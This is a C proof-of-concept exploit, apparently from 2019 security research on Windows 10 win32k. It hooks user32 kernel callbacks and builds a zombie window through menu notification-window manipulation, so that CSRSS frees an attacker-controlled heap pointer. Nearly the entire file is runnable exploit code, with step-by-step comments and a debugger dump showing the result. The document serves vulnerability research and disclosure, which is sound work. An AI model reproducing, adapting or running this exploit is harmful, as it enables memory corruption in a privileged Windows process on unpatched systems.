//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #11 - CSRSS arbitrary user-mode heap pointer free
// Windows 10 x64
//

/*
Based on POC #10!
This time it's a matter of keeping the desktop menu notification window a live,
so the desktop object will unlock it from CSRSS context, thus doing callback to user-mode...
See "MAJOR LOGICAL DIFFERENCE AHEAD" below for more explanation.

00 win32kfull!xxxClientFreeWindowClassExtraBytes
01 win32kfull!xxxFreeWindow+0x22a
02 win32kfull!xxxDestroyWindow+0x377
03 win32kbase!xxxDestroyWindowIfSupported+0x25
04 win32kbase!HMDestroyUnlockedObject+0x69
05 win32kbase!HMUnlockObjectInternal+0x4f
06 win32kbase!HMAssignmentUnlock+0x2d
07 win32kfull!DestroyMenu+0xb4
08 win32kfull!MNFreeItem+0x98
09 win32kfull!DestroyMenu+0x4f
0a win32kbase!_DestroyMenuIfSupported+0x25
0b win32kbase!HMDestroyUnlockedObject+0x69
0c win32kbase!HMUnlockObjectInternal+0x4f
0d win32kbase!HMAssignmentUnlock+0x2d
0e win32kfull!UnlockDesktopMenu+0x2f
0f win32kfull!DestroyPendingDesktops+0xb3218
10 win32kfull!xxxHandleDesktopMessages+0x92
11 win32kfull!xxxDesktopThread+0x480
12 win32kbase!xxxCreateSystemThreads+0x155
13 win32kfull!NtUserCallNoParam+0x70
14 nt!KiSystemServiceCopyEnd+0x25

See r8

1: kd> k
 # Child-SP          RetAddr           Call Site
00 00000045`38abf860 00007ffb`8f6a3494 USER32!_xxxClientFreeWindowClassExtraBytes+0x11
01 00000045`38abf890 00007ffb`8c431144 ntdll!KiUserCallbackDispatcherContinue
02 00000045`38abf8f8 00007ffb`8b57310a win32u!NtUserCallNoParam+0x14
03 00000045`38abf900 00007ffb`8f66a27f winsrvext!StartCreateSystemThreads+0x1a
04 00000045`38abf930 00000000`00000000 ntdll!RtlUserThreadStart+0x2f
1: kd> r
rax=00007ffb8eff9290 rbx=0000000000000000 rcx=00000221b1ad0000
rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000000
rip=00007ffb8eff92a1 rsp=0000004538abf860 rbp=0000000000000000
 r8=0000000041414000  r9=00007ffb8f058070 r10=0000000000000000
r11=0000000000000246 r12=0000000000000000 r13=0000000000000000
r14=0000000000000000 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
USER32!_xxxClientFreeWindowClassExtraBytes+0x11:
0033:00007ffb`8eff92a1 ff15b1060600    call    qword ptr [USER32!_imp_RtlFreeHeap (00007ffb`8f059958)] ds:002b:00007ffb`8f059958={ntdll!RtlFreeHeap (00007ffb`8f612480)}
*/

#include <windows.h>
#include <stdio.h>

// Target USERMODE heap address to release inside current session's CSRSS.EXE process!
PVOID targetAddress = (PVOID)0x41414000;

HWND g_hWnd = NULL; // This is the zombie window that will callback to user-mode from its last unlocking.

int phase1 = 0; // State between threads and callbacks.

// This is the changing HMENU that CLM callback will return to kernel upon each call.
HMENU g_hClmMenu = NULL;

#define ClientAllocExtraBytes_NO 0x7b
#define ClientFreeExtraBytes_NO 0x7c
#define ClientLoadMenu_NO 0x4c
#define GetSysMenuOffset_NO 0x6f

#define DUMMYCLASS "classsdummmy"

typedef NTSTATUS(*faeb_ptr)(ULONG_PTR); // Alloc extra bytes stub prototype.
faeb_ptr g_faeb = NULL;
typedef NTSTATUS(*clm_ptr)(ULONG_PTR); // ClientLoadMenu stub prototype.
clm_ptr g_clm = NULL;
typedef ULONG_PTR(WINAPI *NtUserCallHwndLockPtr)(HWND hWnd, SIZE_T procNumber);
NtUserCallHwndLockPtr NtUserCallHwndLock = NULL;
typedef NTSTATUS(WINAPI *NtCallbackReturnPtr)(PVOID, ULONG, NTSTATUS);
NtCallbackReturnPtr NtCallbackReturnFunc = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

// The following helper function sets a new notification window for a given menu.
// Basically, all we have to do is exploit GetSystemMenu's behavior once again (i.e the HMAssignmentLock in the snippet above).
// Bypassing LockWndMenu full binding.
// Note it overrides g_hClmMenu.
// It will set hWnd as the notification window for a given menu.
void setMenuNotificationWnd(HWND hWnd, HMENU hMenu)
{
	// If no window was passed, then create some window as parent, as it doesn't matter.
	if (hWnd == NULL)
	{
		hWnd = CreateWindow(DUMMYCLASS, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	}

	// Create some termporary menu.
	// Inside CLM tis time we have to return the newly created menu for this manipulation to work.
	g_hClmMenu = CreateMenu();
	// Add the target menu whose notificationWnd we want to replace with a new window.
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hMenu, (LPCSTR)"O_o");
	GetSystemMenu(hWnd, FALSE);

	// We get eventually that the notification window submenu[0] of pm is now pointing to our dummy window...
	// Meanining it doesn't lock our target window anymore.
}

// This client-load-menu callback is called 3 times during our exploit. Where each time requires different treatment.
// 1. By GetSystemMenu - signal first thread for zombification.
// And for the rest of the times - just return menu from g_hClmMenu.
// 2. By GetSystemMenu of setMenuNotificationWnd.
// 3. by GetSysMenuOffset.
// 4. By GetSystemMenu of setMenuNotificationWnd.
LRESULT CALLBACK clm(ULONG_PTR)
{
	ULONG_PTR ret[3] = { 0 };
	// Always return the changing menu that g_hClmMenu refers to.
	ret[0] = (ULONG_PTR)g_hClmMenu;

	printf("Entering CLM\n");
	static int once = 1;
	if (once)
	{
		once = 0;
		// Signal window creation thread that it can proceed to zombification.
		phase1 = 1;
		// Wait a bit for the other thread to die.
		Sleep(1000);
	}

	// Callback or actually return to kernel with our controlled results (handle to menu).
	return NtCallbackReturnFunc((PVOID)ret, sizeof(ret), 0);
}

DWORD CALLBACK threadProc(LPVOID)
{
	HWND hDeskWnd = NULL;
	HMENU hTmpMenu = NULL;

	WNDCLASS wc = { 0 };
	wc.lpszClassName = DUMMYCLASS;
	wc.lpfnWndProc = DefWindowProc;
	RegisterClass(&wc);

	// Set a new desktop so its own cache menus are still not set.
	// So when we call the sysmenu APIs, they actually remember our menu, and not someone else's.
	SetThreadDesktop(CreateDesktop("ShowMeYourDesktopAndIWillTellYouWhoYouAre", NULL, NULL, 0, GENERIC_ALL, NULL));

	// Hook ClientLoadMenu so we can return our menu of choosing to the sysmenu kernel functions.
	hookClientCallback((void**)&g_clm, (void*)clm, ClientLoadMenu_NO);

	///////////////////////////////
	// We start from step #2.
	// (it was easier to document from step 1, but start here with step #2):

	// Next we're going to call GetSystemMenu to do two needed things at once.
	// Create a menu that we return to GetSystemMenu:
	g_hClmMenu = CreateMenu();
	// 1. It will set a notification menu for this submenu.
	hTmpMenu = CreateMenu();
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hTmpMenu, (LPCSTR)"TheBeatles");

	// 2. It calls back to CLM, so we turn our window (g_hWnd) into a zombie at that point.
	// This is the zombie reloading in action:
	GetSystemMenu(g_hWnd, FALSE);

	// By now g_hWnd is a zombie.
	// And we got a menu (g_hClmMenu) that is bound to g_hWnd->sysmenu,
	// and that its submenu (hTmpMenu) has a notification window.
	// Let's separate the menus so we can continue manipulating them for our use.
	RemoveMenu(g_hClmMenu, 0, MF_BYPOSITION);
	// Now we got hTmpMenu->notificationWnd pointing to our zombie and no backpointer from window to menu!
	// That's great.

	// But we introduced a new issue:
	// If we look at the snippet of GetSystemMenu above, we see it calls LockWndMenu.
	// Meaning that g_hWnd->sysmenu->notificationWnd also points to our zombie!
	// We need to break that binding, so our zombie eventually has only one last reference by hTmpMenu.

	// Then all we need is sysmenu->notificationWnd to point to another window.
	// Meaning that we could get LockWndMenu on the sysmenu (g_hClmMenu), with any other window, and we're done,
	// as it internally first unlocks our zombie window.
	// But LockWndMenu is smarter than the snippet I wrote above, it also checks to see that the notification window is either the same one or empty.
	// And both cases are not a fit for us.
	// How can we then, change the sysmenu->notificationWnd? very simple, by putting it as a submenu and invoking GetSystemMenu for its behavior once again :)

	// For that, we got a helper function to do the whole dance.
	// We didn't invoke it earlier, as we needed to do more than this dance as described.
	// Null as we don't care who's the parent.
	setMenuNotificationWnd(NULL, g_hClmMenu);

	// Finally, we got hTmpMenu->notificationWnd to point to a zombie with a last reference!
	// Basically at this point, we could stop and use this menu to attack other objects after calls to DestroyMenu.
	// Because DestroyMenu unlocks the notification window, and we can callback to user-mode while attacking other objects for UAF...
	// But we're on another mission here :)

	///////////////////////////////
	// Step #1:
	// Now we we are going to create a desktop menu.
	HMENU deskMenu = g_hClmMenu = CreateMenu(); // Start with a new menu, to be the desktop menu that UnlockNotifyWindow will be called with.

	// This is tiny step #3.
	// Attach our hTmpMenu as a submenu, which is smashing-ready.
	// Also note that a desktop menu must have another submenu set with a popup.
	AppendMenu(g_hClmMenu, MF_POPUP, (UINT_PTR)hTmpMenu, (LPCSTR)"JaiGuruDevaOm");

	// In the next step we set up the desktop menu.
	// Create the desktop window, which xxxDestroyWindow is acting upon.
	hDeskWnd = CreateWindow(DUMMYCLASS, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	// This time we're calling GetSysMenu which sets a desktop menu.
	NtUserCallHwndLock = (NtUserCallHwndLockPtr)GetProcAddress(GetModuleHandle("win32u"), "NtUserCallHwndLock");
	// GetSysMenuOffset calls our CLM stub, and this is where we return the g_hClmMenu.
	// GetsysMenuOffset doesn't use the hDeskWnd for anything useful but finding its corresponding desktop.
	NtUserCallHwndLock(hDeskWnd, GetSysMenuOffset_NO);

	// So far:
	// 1. We got a g_hDeskWnd->desk->sysmenu = some_new_menu;
	// 2. And we got some_new_menu having the smashing menu (hTmpMenu) as a submenu of the desktop->sysmenu.

	// What we're still missing is that the hDeskWnd is the notificationWnd of the desktop-menu!
	// That's the way for the if-statement to flow into UnlockNotifyWindow, right?
	// So we need to make the g_hClmMenu->notificationWnd to point to our hDeskWnd,
	// without the earlier if-statement in xxxDestroyWindow to derail us from our flow to exploitation.
	// Therefore, we can fix it with yet another notificationWnd dancing (this time using hDeskWnd to be the notification window):
	setMenuNotificationWnd(hDeskWnd, deskMenu);

	// MAJOR LOGICAL DIFFERENCE AHEAD:::

	// In POC #10 we killed the window right here to trigger UnlockNotifyWindow.
	// DestroyWindow(hDeskWnd);
	// However, in this POC, we won't do it.
	// And let the thread die normally.
	// Which will destroy the desktop object we created initially.
	// That same desktop object has the cache pointing to our sysmenu loaded
	// with our smashing submenu and notification window...
	// The desktop object is actually really destroyed after it was deferred from our thread destruction,
	// inside its own desktop destruction logic in xxxDestroyPendingDesktops.
	// This time, it happens inside CSRSS context.
	// Thus, eventually calling client-free-extra-bytes on an arbitrary pointer we control, inside CSRSS.

	// For debugging, set a breakpoint on __xxxClientFreeWindowClassExtraBytes and watch the pointer to be released from RtlFreeHeap.
	// Kaboom
	// DebugBreak();
	return 0;
}

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		static int once = 1;
		if (once)
		{
			printf("CBT hook\n");
			if (g_hWnd == (HWND)wParam) // Just make sure it's our window.
			{
				ExitThread(0);
			}
		}
	}

	return 0;
}

LRESULT CALLBACK faeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Client alloc extra bytes called\n");

		WORD nextHandle = HIWORD(g_hWnd) + 1;
		WORD indexHandle = LOWORD(g_hWnd);
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %d\n", IsWindow(g_hWnd));

		// Create a second thread that will hold a reference on this window, before it becomes a zombie.
		CreateThread(NULL, 0, threadProc, NULL, 0, NULL);
		// Wait for the second thread to enter CLM with our to-be-zombie window locked.
		while (!phase1) Sleep(10);

		// Destroy the window to make it a zombie.
		DestroyWindow(g_hWnd);

		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
		ULONG_PTR a[3] = { 0 };
		a[0] = (ULONG_PTR)targetAddress;
		return NtCallbackReturnFunc((PVOID)a, sizeof(a), 0);
	}

	return g_faeb(a);
}

int main()
{
	// We need to locally allocate the target address as the ClientAllocExtraBytes ProvbeForRead's our address.
	LPVOID target = (LPVOID)(((ULONG_PTR)targetAddress) & ~0xfff); // Round down to pages.
	PVOID retAddr = VirtualAlloc(target, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (retAddr == NULL)
	{
		printf("can't allocate target address: %d\n", GetLastError());
		return -1;
	}

	NtCallbackReturnFunc = (NtCallbackReturnPtr)GetProcAddress(GetModuleHandle("ntdll"), "NtCallbackReturn");

	WNDCLASS wc = { 0 };
	wc.lpszClassName = "someclass";
	wc.lpfnWndProc = DefWindowProc;
	// This is crucial for xxxCreateWindowEx to do client-extra-bytes allocation/deallocation.
	wc.cbWndExtra = 100;
	RegisterClass(&wc);

	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}

	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);

	// CBT is where we terminate our own thread.
	SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	// WS_SYSMENU is needed for sysmenu APIs to work.
	CreateWindow(wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW | WS_SYSMENU, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	return 0;
}
